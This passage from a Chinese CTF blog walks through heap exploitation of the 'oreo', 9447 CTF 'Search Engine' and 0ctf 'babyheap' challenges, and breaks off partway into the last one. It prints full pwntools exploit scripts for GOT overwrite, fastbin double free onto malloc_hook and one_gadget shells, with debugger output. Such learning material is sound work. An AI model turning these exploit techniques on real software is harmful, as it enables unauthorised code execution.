<h3 id="覆写got表"><a href="#覆写got表" class="headerlink" title="覆写got表"></a>覆写got表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">edit(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里ctf-wiki用的是strlen表，<strong>然后这里有个小细节。。。记得第二个位置才是结构体的开头，所以payload要放在add的第二个位置</strong>，构造payload为strlen的地址，然后在用edit函数进行编辑</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">Message</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ST1C_4</span></span><br><span class="line"></span><br><span class="line">  v0 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter any notice you'd like to submit with your order: "</span>);</span><br><span class="line">  fgets(dword_804A2A8, <span class="number">128</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  sub_80485EC(dword_804A2A8);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>edit函数在ida里的原样，就是从0x804a2a8指向的空间写东西，这里指向的空间是0x0804a2c0也就是我们刚刚payload写入的位置，然后进行编辑</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/60wx 0x804a2a8-0x8</span><br><span class="line">0x804a2a0:	0x00000001	0x00000041	0x0804a250	0x61616161</span><br><span class="line">0x804a2b0:	0x61616161	0x61616161	0x61616161	0x61616161</span><br><span class="line">0x804a2c0:	0x62000061	0x62626262	0x62626262	0x62626262</span><br><span class="line">0x804a2d0:	0x62626262	0x62626262	0x62626262	0x00000000</span><br><span class="line">0x804a2e0:	0x0000000a	0x00000100	0x62626262	0x62626262</span><br><span class="line">0x804a2f0:	0x62626262	0x00000000	0x63636363	0x63636363</span><br><span class="line">0x804a300:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a310:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a320:	0x63636363	0x63636363	0x63636363	0x63636363</span><br><span class="line">0x804a330:	0x63636363	0x63636363	0x63636363	0x00636363</span><br><span class="line">0x804a340:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a350:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a360:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a370:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x804a380:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<p>你看，地址变成了0x804a250</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x80487eb    call   fgets@plt &lt;0x8048480&gt;</span><br><span class="line">       s: 0x804a250 (strlen@got.plt) —▸ 0xf7e3d440 ◂— 0x7c8b5756</span><br><span class="line">       n: 0x80</span><br><span class="line">       stream: 0xf7f715a0 (_IO_2_1_stdin_) ◂— 0xfbad208</span><br></pre></td></tr></table></figure>

<p>就是got表的地址<br>然后编辑过后调用strlen就会出发了，这里我有个不懂的地方就是将got表覆盖成system的地址，然后我不知道如何进行传参数，ctf-wiki给的是‘;/bin/sh\x00’，经过测试system(“abcd;/bin/sh”)在c语言里也是可以获得权限的，<br>这里是调用strlen，strlen求的是payload长度，所以相当于system(payload)<br>也就是相当于system(p32(sys_addr)+”;/bin/sh”)</p>
<p>并且他前面求出了bin_sh地址，他也没用上。应该也是这里卡住了一小会，我是转头改用了one_gadget</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">'puts'</span>])</span><br><span class="line">payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">one_gadget = libc_base + <span class="number">0x5fbc5</span></span><br><span class="line">payload = p32(one_gadget)</span><br><span class="line">edit(payload)</span><br><span class="line">puts()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>完结，撒花<br>完整exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">ctx.binary = <span class="string">'oreo'</span></span><br><span class="line">ctx.remote_libc = <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./oreo'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ctx.debug_remote_libc == <span class="literal">False</span>:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ctx.remote_libc</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">    p = ctx.start()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">""</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'PID: '</span> + str(proc.pidof(p)[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name, description)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.sendline(description)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(payload)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">puts</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="comment">#first leak the libc</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(puts_got)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    show()</span><br><span class="line">    p.recvuntil(<span class="string">"==================================="</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"Description: "</span>)</span><br><span class="line">    result = p.recvuntil(<span class="string">"==================================="</span>)[:<span class="number">4</span>]</span><br><span class="line">    puts_addr = u32(result)</span><br><span class="line">    log.success(<span class="string">"puts_got = &#123;:#x&#125;"</span>.format(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    sys_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    bin_sh = libc_base + libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#second fake bin</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="number">0x3f</span>:</span><br><span class="line">        add(<span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), <span class="string">'b'</span>*<span class="number">25</span>)</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">27</span> + p32(<span class="number">0x804A2A8</span>)</span><br><span class="line">    add(payload, <span class="string">'a'</span>*<span class="number">25</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">### begin fake </span></span><br><span class="line">    payload = p8(<span class="number">0</span>)*<span class="number">0x20</span> + p32(<span class="number">0x40</span>) + p32(<span class="number">0x100</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x34</span>, <span class="string">'b'</span>)</span><br><span class="line">    payload += p32(<span class="number">0</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>, <span class="string">'c'</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    edit(payload)</span><br><span class="line">    delete()</span><br><span class="line">    p.recvuntil(<span class="string">'Okay order submitted!\n'</span>)</span><br><span class="line">    payload = p32(elf.got[<span class="string">'strlen'</span>])</span><br><span class="line">    payload = payload.ljust(<span class="number">25</span>,<span class="string">'a'</span>)</span><br><span class="line">    add(<span class="string">'b'</span>*<span class="number">27</span> + p32(<span class="number">0</span>), payload)</span><br><span class="line">    <span class="comment">#one_gadget = libc_base + 0x5fbc5</span></span><br><span class="line">    <span class="comment">#payload = p32(one_gadget)</span></span><br><span class="line">    payload = p32(sys_addr) + <span class="string">";/bin/sh\x00"</span></span><br><span class="line">    edit(payload)</span><br><span class="line">    puts()</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="2015-9447-CTF-Search-Engine"><a href="#2015-9447-CTF-Search-Engine" class="headerlink" title="2015 9447 CTF : Search Engine"></a>2015 9447 CTF : Search Engine</h2><p>这道题说实话，我连功能怎么使用都不知道。。最后看了wp，也是似懂非懂，不过大概漏洞过程我是理解了的</p>
<p>先利用unsortbin泄露地址<br>double free 到malloc_hook<br>然后改malloc_hook为one_gadget<br>错位部分自己解决</p>
<p>最近学到一个新姿势，double free触发malloc_hook，下一篇写个最近遇到的有趣的题目</p>
<p>其余部分参考ctf-wiki</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'search'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'search'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================a</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"><span class="comment"># FORTIFY:  Enabled</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">offset_bin_main_arena</span><span class="params">(idx)</span>:</span></span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">unsortedbin_offset_main_arena = offset_bin_main_arena(<span class="number">0</span>)</span><br><span class="line">main_arena_offset = <span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_sentence</span><span class="params">(s)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    io.sendline(<span class="string">'2'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Enter the sentence size:\n"</span>)</span><br><span class="line">    io.sendline(str(len(s)))</span><br><span class="line">    io.send(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search_word</span><span class="params">(word)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"3: Quit\n"</span>)</span><br><span class="line">    io.sendline(<span class="string">'1'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">"Enter the word size:\n"</span>)</span><br><span class="line">    io.sendline(str(len(word)))</span><br><span class="line">    io.send(word)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">    smallbin_sentence = <span class="string">'s'</span> * <span class="number">0x85</span> + <span class="string">' m '</span></span><br><span class="line">    index_sentence(smallbin_sentence)</span><br><span class="line">    search_word(<span class="string">'m'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Found '</span> + str(len(smallbin_sentence)) + <span class="string">': '</span>)</span><br><span class="line">    unsortedbin_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line">    <span class="keyword">return</span> unsortedbin_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># 1. leak libc base</span></span><br><span class="line">    unsortedbin_addr = leak_libc()</span><br><span class="line">    main_arena_addr = unsortedbin_addr - unsortedbin_offset_main_arena</span><br><span class="line">    libc_base = main_arena_addr - main_arena_offset</span><br><span class="line">    log.success(<span class="string">'unsortedbin addr: '</span> + hex(unsortedbin_addr))</span><br><span class="line">    log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">    <span class="comment"># 2. create cycle fastbin 0x70 size</span></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#a</span></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#b</span></span><br><span class="line">    index_sentence(<span class="string">'c'</span> * <span class="number">0x5d</span> + <span class="string">' d '</span>)  <span class="comment">#c</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># a-&gt;b-&gt;c-&gt;NULL</span></span><br><span class="line">    search_word(<span class="string">'d'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># b-&gt;a-&gt;b-&gt;a-&gt;...</span></span><br><span class="line">    search_word(<span class="string">'\x00'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">'y'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Delete this sentence (y/n)?\n'</span>)</span><br><span class="line">    io.sendline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 3. fastbin attack to malloc_hook nearby chunk</span></span><br><span class="line">    fake_chunk_addr = main_arena_addr - <span class="number">0x33</span></span><br><span class="line">    fake_chunk = p64(fake_chunk_addr).ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(fake_chunk)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'a'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(<span class="string">'b'</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">    one_gadget_addr = libc_base + <span class="number">0xf02a4</span></span><br><span class="line">    payload = <span class="string">'a'</span> * <span class="number">0x13</span> + p64(one_gadget_addr)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x60</span>, <span class="string">'f'</span>)</span><br><span class="line"></span><br><span class="line">    index_sentence(payload)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>




<h2 id="2017-0ctf-babyheap"><a href="#2017-0ctf-babyheap" class="headerlink" title="2017 0ctf babyheap"></a>2017 0ctf babyheap</h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">fill</span><span class="params">(chunk *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = read_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = LODWORD(a1[(<span class="keyword">int</span>)result].inuse);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">"Size: "</span>);</span><br><span class="line">      result = read_num();</span><br><span class="line">      v3 = result;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Content: "</span>);</span><br><span class="line">        result = read_content(a1[v2].ptr, v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里写任意长度，堆溢出，原来想unlink发觉没全局变量</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">free_chunk</span><span class="params">(chunk *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Index: "</span>);</span><br><span class="line">  result = read_num();</span><br><span class="line">  v2 = result;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">int</span>)result &gt;= <span class="number">0</span> &amp;&amp; (<span class="keyword">int</span>)result &lt;= <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = LODWORD(a1[(<span class="keyword">int</span>)result].inuse);</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)result == <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      LODWORD(a1[v2].inuse) = <span class="number">0</span>;</span><br><span class="line">      a1[v2].size = <span class="number">0L</span>L;</span><br><span class="line">      <span class="built_in">free</span>(a1[v2].ptr);</span><br><span class="line">      result = (__int64)&amp;a1[v2];</span><br><span class="line">      *(_QWORD *)(result + <span class="number">16</span>) = <span class="number">0L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>free后没有置空，存在double free</p>
<h3 id="漏洞利用过程-1"><a href="#漏洞利用过程-1" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>这道题我原来觉得很简单，后面自己做起来才发觉问题较多，不是难，而是细节性的问题比较多</li>
<li>大体思路是构造unsortbin泄露libc地址，然后通过覆盖malloc_hook成one_gadget拿到shell</li>
<li>细节点1：你会发觉这道题你没有全局变量，所以要在堆上做文章，通过连续free两个chunk，第一个free的chunk的fd会指向第二个</li>
